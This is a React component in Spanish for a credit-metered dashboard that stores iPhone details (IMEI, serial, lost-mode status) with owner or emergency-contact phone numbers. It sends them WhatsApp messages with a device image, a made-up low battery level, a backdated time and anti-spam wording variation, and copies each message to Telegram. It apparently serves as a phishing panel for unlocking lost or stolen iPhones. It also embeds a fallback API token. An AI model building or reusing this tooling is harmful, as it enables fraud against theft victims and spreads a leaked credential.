import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { toast } from '@/hooks/use-toast';
import { Trash2, Send, RefreshCw, Edit, Image, ImageOff } from 'lucide-react';
import { supabase } from '@/integrations/supabase/client';
import { getIphoneImageUrl } from '@/utils/iphoneImages';
import { generateRandomMessage } from '@/utils/messageVariations';
import EditProcessDialog from './EditProcessDialog';

interface Process {
  id: string;
  client_name: string;
  country_code: string;
  phone_number: string;
  contact_type: string;
  owner_name: string | null;
  iphone_model: string;
  storage: string;
  color: string;
  imei: string;
  serial_number: string;
  url: string | null;
  lost_mode?: boolean;
  status: string;
  created_at: string;
  updated_at: string;
  user_id: string;
}

interface ProcessListProps {
  userType: 'admin' | 'user';
}

const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
  const [processes, setProcesses] = useState<Process[]>([]);
  const [loading, setLoading] = useState(true);
  const [sendingMessage, setSendingMessage] = useState<{ id: string; language: string } | null>(null);
  const [userCredits, setUserCredits] = useState(0);
  const [editingProcess, setEditingProcess] = useState<Process | null>(null);
  const [isEditDialogOpen, setIsEditDialogOpen] = useState(false);
  const [imageStatus, setImageStatus] = useState<{ [key: string]: boolean }>({});

  useEffect(() => {
    loadProcesses();
    loadUserCredits();
    
    const channel = supabase
      .channel('processes-changes')
      .on('postgres_changes', 
        { event: '*', schema: 'public', table: 'processes' },
        (payload) => {
          console.log('Process change detected:', payload);
          loadProcesses();
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [userType]);

  useEffect(() => {
    if (processes.length > 0) {
      checkImageAvailability(processes);
      loadUserCredits(); // Reload credits when processes change
    }
  }, [processes]);

  const loadUserCredits = async () => {
    try {
      const { data: { session } } = await supabase.auth.getSession();
      if (!session) return;

      console.log('Loading credits for user:', session.user.id);
      
      const { data: profile, error } = await supabase
        .from('profiles')
        .select('credits')
        .eq('id', session.user.id)
        .maybeSingle();

      console.log('Credits query result:', { profile, error });

      if (error) {
        console.error('Error loading user credits:', error);
        return;
      }

      setUserCredits(profile?.credits || 0);
    } catch (error) {
      console.error('Error loading user credits:', error);
    }
  };

  const loadProcesses = async () => {
    try {
      setLoading(true);
      console.log('Loading processes for userType:', userType);
      
      const { data: { session } } = await supabase.auth.getSession();
      console.log('Current session:', session?.user?.email);

      if (!session) {
        console.log('No session found');
        setProcesses([]);
        return;
      }

      console.log('Loading processes for user:', session.user.id);
      const { data, error } = await supabase
        .from('processes')
        .select('*')
        .eq('user_id', session.user.id)
        .order('created_at', { ascending: false });
      
      console.log('Processes query result:', { data, error, userType });

      if (error) {
        console.error('Error loading processes:', error);
        throw error;
      }

      console.log('Processes loaded:', data?.length || 0);
      const processesWithDefaults = data?.map(process => ({
        ...process,
        lost_mode: Boolean((process as any).lost_mode),
        status: (process as any).status || 'nuevo'
      })) || [];
      
      setProcesses(processesWithDefaults);
    } catch (error: any) {
      console.error('Error loading processes:', error);
      toast({
        title: "Error",
        description: `Error al cargar procesos: ${error.message}`,
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  const checkImageExists = async (url: string): Promise<boolean> => {
    try {
      const response = await fetch(url, { method: 'HEAD' });
      return response.ok;
    } catch (error) {
      console.log('Image check failed:', error);
      return false;
    }
  };

  const checkImageAvailability = async (processes: Process[]) => {
    const imageStatusMap: { [key: string]: boolean } = {};
    
    for (const process of processes) {
      const imageUrl = getIphoneImageUrl(process.iphone_model, process.color);
      const hasImage = await checkImageExists(imageUrl);
      imageStatusMap[process.id] = hasImage;
    }
    
    setImageStatus(imageStatusMap);
  };

  const deleteProcess = async (processId: string) => {
    if (!confirm('¿Estás seguro de que quieres eliminar este proceso?')) {
      return;
    }

    try {
      console.log('Deleting process:', processId);
      
      const { error } = await supabase
        .from('processes')
        .delete()
        .eq('id', processId);

      if (error) {
        console.error('Error deleting process:', error);
        throw error;
      }

      toast({
        title: "Proceso eliminado",
        description: "El proceso ha sido eliminado exitosamente",
      });

      await loadProcesses();
    } catch (error: any) {
      console.error('Error deleting process:', error);
      toast({
        title: "Error",
        description: error.message || "Error al eliminar proceso",
        variant: "destructive",
      });
    }
  };

  const handleEditProcess = (process: Process) => {
    setEditingProcess(process);
    setIsEditDialogOpen(true);
  };

  const handleCloseEditDialog = () => {
    setEditingProcess(null);
    setIsEditDialogOpen(false);
  };

  const handleProcessUpdated = () => {
    loadProcesses();
  };

  const sendWhatsAppMessage = async (process: Process, language: 'spanish' | 'english') => {
    try {
      if (userCredits <= 0) {
        toast({
          title: "Sin créditos suficientes",
          description: "No tienes créditos suficientes para enviar mensajes. Contacta al administrador.",
          variant: "destructive",
        });
        return;
      }

      setSendingMessage({ id: process.id, language });
      console.log(`Sending WhatsApp message for process: ${process.id} in ${language}`);

      const settingsKeys = language === 'spanish' 
        ? ['whatsapp_instance', 'whatsapp_token']
        : ['whatsapp_instance_en', 'whatsapp_token_en'];

      const { data: settings } = await supabase
        .from('system_settings')
        .select('*')
        .in('setting_key', settingsKeys);

      const config = settings?.reduce((acc: any, setting: any) => {
        acc[setting.setting_key] = setting.setting_value;
        return acc;
      }, {});

      const instanceId = language === 'spanish' 
        ? (config?.whatsapp_instance || 'instance126876')
        : (config?.whatsapp_instance_en || 'instance_en_default');
        
      const token = language === 'spanish' 
        ? (config?.whatsapp_token || '4ecj8581tubua7ry')
        : (config?.whatsapp_token_en || 'token_en_default');

      if (!instanceId || !token || instanceId.includes('default') || token.includes('default')) {
        toast({
          title: "Configuración faltante",
          description: `No hay configuración de WhatsApp para ${language === 'spanish' ? 'español' : 'inglés'}. Configúrala en Configuraciones.`,
          variant: "destructive",
        });
        return;
      }

      const imageUrl = getIphoneImageUrl(process.iphone_model, process.color);
      console.log('Generated iPhone image URL:', imageUrl);

      const imageExists = imageStatus[process.id] !== undefined ? imageStatus[process.id] : await checkImageExists(imageUrl);
      console.log('Image exists:', imageExists);

      const { battery, delayedTime, formatDate, formatTime } = generateDynamicValues();

      // Usar el generador de mensajes aleatorios
      const message = generateRandomMessage(process, language, battery, delayedTime, formatDate, formatTime);

      let result;

      if (imageExists) {
        console.log('Sending message with image');
        const response = await fetch(`https://api.ultramsg.com/${instanceId}/messages/image`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
          },
          body: new URLSearchParams({
            token: token,
            to: `${process.country_code}${process.phone_number}`,
            image: imageUrl,
            caption: message,
          }),
        });
        result = await response.json();
      } else {
        console.log('Image not found, sending text only message');
        const response = await fetch(`https://api.ultramsg.com/${instanceId}/messages/chat`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
          },
          body: new URLSearchParams({
            token: token,
            to: `${process.country_code}${process.phone_number}`,
            body: message,
          }),
        });
        result = await response.json();
      }

      console.log('WhatsApp API response:', result);

      if (result.sent === true || (result.sent === "true")) {
        const { data: { user } } = await supabase.auth.getUser();
        
        if (!user) {
          throw new Error('Usuario no autenticado');
        }

        const { error: creditError } = await supabase
          .from('profiles')
          .update({ 
            credits: userCredits - 1,
            updated_at: new Date().toISOString()
          })
          .eq('id', user.id);

        if (creditError) {
          console.error('Error updating credits:', creditError);
          throw new Error('Error al descontar créditos');
        }

        setUserCredits(prev => prev - 1);

        const { error: messageError } = await supabase
          .from('messages')
          .insert({
            user_id: user.id,
            process_id: process.id,
            message_content: message,
            recipient_phone: `${process.country_code}${process.phone_number}`,
            status: 'sent',
            sent_at: new Date().toISOString()
          });

        if (messageError) {
          console.error('Error saving message:', messageError);
        }

        const { error: updateError } = await supabase
          .from('processes')
          .update({ 
            status: 'enviado',
            updated_at: new Date().toISOString()
          })
          .eq('id', process.id);

        if (updateError) {
          console.error('Error updating process status:', updateError);
        }

        const messageType = imageExists ? 'con imagen' : 'solo texto (imagen no disponible)';
        const languageText = language === 'spanish' ? 'español' : 'inglés';
        const contactTypeText = process.contact_type === 'propietario' ? 'propietario' : 'contacto de emergencia';
        
        toast({
          title: "Mensaje enviado",
          description: `Mensaje ${messageType} enviado en ${languageText} a ${process.client_name} (${contactTypeText}). Batería: ${battery}%. Créditos restantes: ${userCredits - 1}. Variación anti-spam aplicada.`,
        });

        await loadProcesses();

        // Enviar notificación Telegram automáticamente después del mensaje WhatsApp
        try {
          console.log('Sending Telegram notification...');
          const { error: telegramError } = await supabase.functions.invoke('telegram-notification', {
            body: {
              NotificationTitle: `${process.country_code}${process.phone_number}`,
              NotificationMessage: message
            }
          });

          if (telegramError) {
            console.error('Error sending Telegram notification:', telegramError);
          } else {
            console.log('Telegram notification sent successfully');
          }
        } catch (telegramError) {
          console.error('Failed to send Telegram notification:', telegramError);
        }
      } else {
        const errorMessage = result.message || result.error || 'La instancia de WhatsApp no está funcionando correctamente';
        throw new Error(`Error en la instancia: ${errorMessage}`);
      }
    } catch (error: any) {
      console.error('Error sending WhatsApp message:', error);
      toast({
        title: "Error de envío",
        description: `${error.message}. No se han descontado créditos.`,
        variant: "destructive",
      });
    } finally {
      setSendingMessage(null);
    }
  };

  const generateDynamicValues = () => {
    // Batería aleatoria por debajo del 40%
    const battery = Math.floor(Math.random() * 35) + 5; // Entre 5% y 39%
    
    // Fecha/hora con 2 horas de retraso
    const now = new Date();
    const delayedTime = new Date(now.getTime() - 2 * 60 * 60 * 1000); // 2 horas atrás
    
    const formatDate = (date: Date, language: 'spanish' | 'english') => {
      if (language === 'spanish') {
        return date.toLocaleDateString('es-ES', { 
          day: '2-digit', 
          month: '2-digit', 
          year: 'numeric' 
        });
      } else {
        return date.toLocaleDateString('en-US', { 
          month: '2-digit', 
          day: '2-digit', 
          year: 'numeric' 
        });
      }
    };
    
    const formatTime = (date: Date) => {
      return date.toLocaleTimeString('es-ES', { 
        hour: '2-digit', 
        minute: '2-digit',
        hour12: false
      });
    };

    return {
      battery,
      delayedTime,
      formatDate,
      formatTime
    };
  };

  if (loading) {
    return (
      <Card className="bg-black/20 backdrop-blur-xl border border-blue-500/20">
        <CardContent className="p-6">
          <p className="text-blue-200/70 text-center">Cargando procesos...</p>
        </CardContent>
      </Card>
    );
  }

  return (
    <div className="space-y-6">
      <div className="flex justify-between items-center">
        <h2 className="text-2xl font-bold text-blue-300">
          Mis Procesos ({processes.length})
        </h2>
        <div className="flex items-center space-x-4">
          <div className="bg-gradient-to-r from-purple-600 to-purple-800 text-white px-4 py-2 rounded-lg">
            <span className="text-sm">Créditos: {userCredits}</span>
          </div>
          <Button
            onClick={loadProcesses}
            className="bg-blue-600/20 hover:bg-blue-600/30 text-blue-300"
            size="sm"
          >
            <RefreshCw className="h-4 w-4 mr-2" />
            Actualizar
          </Button>
        </div>
      </div>

      {processes.length === 0 ? (
        <Card className="bg-black/20 backdrop-blur-xl border border-blue-500/20">
          <CardContent className="p-8">
            <div className="text-center">
              <p className="text-blue-200/70 mb-4">No hay procesos guardados</p>
              <p className="text-blue-200/50 text-sm">
                Los procesos que agregues aparecerán aquí listos para enviar.
              </p>
            </div>
          </CardContent>
        </Card>
      ) : (
        <div className="space-y-4">
          {processes.map((process) => (
            <Card key={process.id} className="bg-black/20 backdrop-blur-xl border border-blue-500/20">
              <CardHeader>
                <div className="flex flex-col lg:flex-row lg:justify-between lg:items-start gap-4">
                  <div className="flex-1">
                    <div className="flex items-center gap-2 mb-2">
                      <CardTitle className="text-blue-300">{process.client_name}</CardTitle>
                      {imageStatus[process.id] !== undefined && (
                        <div className="flex items-center gap-1">
                          {imageStatus[process.id] ? (
                            <div className="flex items-center gap-1 bg-green-600/20 text-green-300 px-2 py-1 rounded-full text-xs">
                              <Image className="h-3 w-3" />
                              <span>Con imagen</span>
                            </div>
                          ) : (
                            <div className="flex items-center gap-1 bg-orange-600/20 text-orange-300 px-2 py-1 rounded-full text-xs">
                              <ImageOff className="h-3 w-3" />
                              <span>Sin imagen</span>
                            </div>
                          )}
                        </div>
                      )}
                    </div>
                    <p className="text-blue-200/70 text-sm">
                      {process.country_code} {process.phone_number} ({process.contact_type})
                    </p>
                    {process.owner_name && (
                      <p className="text-blue-200/60 text-xs mt-1">
                        {process.contact_type === 'propietario' ? 'Propietario' : 'Contacto de emergencia de'}: {process.owner_name}
                      </p>
                    )}
                    {process.lost_mode && (
                      <p className="text-orange-400 text-xs mt-1 font-medium">
                        📱 En modo perdido
                      </p>
                    )}
                  </div>
                  <div className="flex flex-col sm:flex-row items-start sm:items-center gap-3">
                    <Badge 
                      variant={process.status === 'enviado' ? 'default' : 'secondary'}
                      className={process.status === 'enviado' ? 'bg-green-600' : 'bg-yellow-600'}
                    >
                      {process.status}
                    </Badge>
                    
                    {/* Botones de envío */}
                    <div className="flex flex-col sm:flex-row gap-2 w-full sm:w-auto">
                      <Button
                        size="sm"
                        onClick={() => sendWhatsAppMessage(process, 'spanish')}
                        disabled={sendingMessage?.id === process.id || userCredits <= 0}
                        className={`${
                          userCredits <= 0 
                            ? 'bg-gray-600/20 text-gray-400 cursor-not-allowed' 
                            : 'bg-blue-600/20 hover:bg-blue-600/30 text-blue-300'
                        } w-full sm:w-auto min-w-[120px] text-xs sm:text-sm`}
                        title={userCredits <= 0 ? "Sin créditos suficientes" : "Enviar en español"}
                      >
                        {sendingMessage?.id === process.id && sendingMessage?.language === 'spanish' ? (
                          <RefreshCw className="h-4 w-4 animate-spin" />
                        ) : (
                          <>Enviar ES 🇪🇸</>
                        )}
                      </Button>

                      <Button
                        size="sm"
                        onClick={() => sendWhatsAppMessage(process, 'english')}
                        disabled={sendingMessage?.id === process.id || userCredits <= 0}
                        className={`${
                          userCredits <= 0 
                            ? 'bg-gray-600/20 text-gray-400 cursor-not-allowed' 
                            : 'bg-green-600/20 hover:bg-green-600/30 text-green-300'
                        } w-full sm:w-auto min-w-[120px] text-xs sm:text-sm`}
                        title={userCredits <= 0 ? "Sin créditos suficientes" : "Send in English"}
                      >
                        {sendingMessage?.id === process.id && sendingMessage?.language === 'english' ? (
                          <RefreshCw className="h-4 w-4 animate-spin" />
                        ) : (
                          <>Send EN 🇺🇸</>
                        )}
                      </Button>
                    </div>

                    {/* Botones de acción */}
                    <div className="flex gap-2">
                      <Button
                        size="sm"
                        onClick={() => handleEditProcess(process)}
                        className="bg-yellow-600/20 hover:bg-yellow-600/30 text-yellow-300"
                        title="Editar proceso"
                      >
                        <Edit className="h-4 w-4" />
                      </Button>

                      <Button
                        size="sm"
                        onClick={() => deleteProcess(process.id)}
                        className="bg-red-600/20 hover:bg-red-600/30 text-red-300"
                        title="Eliminar proceso"
                      >
                        <Trash2 className="h-4 w-4" />
                      </Button>
                    </div>
                  </div>
                </div>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 text-sm">
                  <div>
                    <p className="text-blue-200/50">Modelo:</p>
                    <p className="text-blue-200">{process.iphone_model}</p>
                  </div>
                  <div>
                    <p className="text-blue-200/50">Almacenamiento:</p>
                    <p className="text-blue-200">{process.storage}</p>
                  </div>
                  <div>
                    <p className="text-blue-200/50">Color:</p>
                    <p className="text-blue-200">{process.color}</p>
                  </div>
                  <div>
                    <p className="text-blue-200/50">IMEI:</p>
                    <p className="text-blue-200">{process.imei}</p>
                  </div>
                  <div>
                    <p className="text-blue-200/50">Número de Serie:</p>
                    <p className="text-blue-200">{process.serial_number}</p>
                  </div>
                  <div>
                    <p className="text-blue-200/50">Tipo de Contacto:</p>
                    <p className="text-blue-200">{process.contact_type}</p>
                  </div>
                  {process.owner_name && (
                    <div>
                      <p className="text-blue-200/50">
                        {process.contact_type === 'propietario' ? 'Propietario:' : 'Contacto de emergencia de:'}
                      </p>
                      <p className="text-blue-200">{process.owner_name}</p>
                    </div>
                  )}
                  {process.url && (
                    <div className="md:col-span-2 lg:col-span-3">
                      <p className="text-blue-200/50">URL:</p>
                      <p className="text-blue-200 break-all">{process.url}</p>
                    </div>
                  )}
                  <div className="md:col-span-2 lg:col-span-3">
                    <p className="text-blue-200/50">Creado:</p>
                    <p className="text-blue-200">{new Date(process.created_at).toLocaleString()}</p>
                  </div>
                </div>
              </CardContent>
            </Card>
          ))}
        </div>
      )}

      <EditProcessDialog
        process={editingProcess}
        isOpen={isEditDialogOpen}
        onClose={handleCloseEditDialog}
        onProcessUpdated={handleProcessUpdated}
      />
    </div>
  );
};

export default ProcessList;
